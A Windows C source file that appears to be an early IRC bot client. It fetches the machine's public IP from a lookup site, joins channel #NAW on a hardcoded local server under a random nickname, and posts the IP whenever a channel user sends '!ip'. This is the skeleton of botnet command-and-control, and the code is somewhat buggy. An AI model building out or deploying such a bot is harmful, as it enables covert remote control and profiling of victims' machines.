#include "stdio.h"
#include "winsock2.h"
char buffer[5000];
char chan[] = "#NAW";
char user[20];
SOCKADDR_IN valip;
int sockirc;
char ip[20];

void tiragepseudo()
{
  srand(time(NULL) * GetTickCount());
  int partie1 = rand() % 255;
  srand(time(NULL));
  int partie2 = rand() % 255;
  sprintf(user, "N%iA%iW", partie1, partie2);
}

int findip()
{
  int sockip;
  int test;
  struct sockaddr_in mysockip;
  struct hostent *hoste;
  int connected = 1;
  WORD wVersionRequested;
  WSADATA WSAData;
  wVersionRequested = MAKEWORD(1, 1);
  WSAStartup(wVersionRequested, &WSAData);
  sockip = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  memset(&mysockip, 0, sizeof(mysockip));
  mysockip.sin_family = AF_INET;
  hoste = gethostbyname("checkip.dyndns.org");
  memcpy(&(mysockip.sin_addr), hoste->h_addr, hoste->h_length);
  mysockip.sin_port = htons(80);
  test = connect(sockip, (struct sockaddr *)&mysockip, sizeof(mysockip));
  if (connected == 1)
  {
    strcpy(buffer, "GET index.php HTTP/1.1\r\n\r\n\r\n");
    send(sockip, buffer, strlen(buffer), 0);
    memset(buffer, '\0', 5000);
    recv(sockip, buffer, 5000, 0);

    memset(buffer, '\0', 5000);
    recv(sockip, buffer, 5000, 0);

    int i = 76;
    int len = 0;
    int stop = 1;
    while (stop)
    {
      i++;
      len++;
      if (buffer[i] == '<')
        stop = 0;
    }
    i = 76;
    int j = 0;
    for (len; len > 0; len--)
    {
      ip[j] = buffer[i];
      j++;
      i++;
    }
  }
  closesocket(sockip);
}

void privmsgall(char message[1024])
{
  strcpy(buffer, "PRIVMSG ");
  strcat(buffer, chan);
  strcat(buffer, " :");
  strcat(buffer, message);
  strcat(buffer, "\n");
  send(sockirc, buffer, strlen(buffer), 0);
  printf("== > %s", buffer);
}

DWORD WINAPI connectIRC(LPVOID lpParam)
{
  tiragepseudo();
  findip();
  unsigned short port = 6667;
  int connected;
  int joinchan;
  struct sockaddr_in mysockirc;
  struct hostent *hoste;
  char host[] = "127.0.0.1";

  sockirc = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  memset(&mysockirc, 0, sizeof(mysockirc));
  mysockirc.sin_family = AF_INET;
  hoste = gethostbyname(host);
  memcpy(&(mysockirc.sin_addr), hoste->h_addr, hoste->h_length);
  mysockirc.sin_port = htons(port);
  int test = connect(sockirc, (struct sockaddr *)&mysockirc, sizeof(mysockirc));
  connected = 1;
  joinchan = 0;
  if (test < 0)
  {
    printf("impossible de se connecter\n");
    printf("2eme tentative dans 10s\n");
    sleep(5000);
    int test2 = connect(sockirc, (struct sockaddr *)&mysockirc, sizeof(mysockirc));
    if (test2 < 0)
    {
      printf("impossible de se connecter\n");
      printf("3eme tentative dans 10s\n");
      sleep(5000);
      int test3 = connect(sockirc, (struct sockaddr *)&mysockirc, sizeof(mysockirc));
      if (test3 < 0)
      {
        connected = 0;
      }
    }
  };

  if (connected == 1)
  {
    strcpy(buffer, "NICK ");
    strcat(buffer, user);
    strcat(buffer, "\r\nUSER name \"crosoft.com\" \"");
    strcat(buffer, host);
    strcat(buffer, "\" :ident\r\n");
    send(sockirc, buffer, strlen(buffer), 0);
    strcpy(buffer, "JOIN ");
    strcat(buffer, chan);
    strcat(buffer, "\r\n");
    send(sockirc, buffer, strlen(buffer), 0);

    while (connected == 1)
    {
      memset(buffer, 0x00, 5000);
      recv(sockirc, buffer, 5000, 0);
      if ((strncasecmp(buffer, "PING", 4)) == 0)
      {
        buffer[1] = 'O';
        send(sockirc, buffer, strlen(buffer), 0);
        printf("== > %s", buffer);
      }
      if ((strstr(buffer, "!ip")) != NULL)
      {
        privmsgall(ip);
      }
    }
  }
}
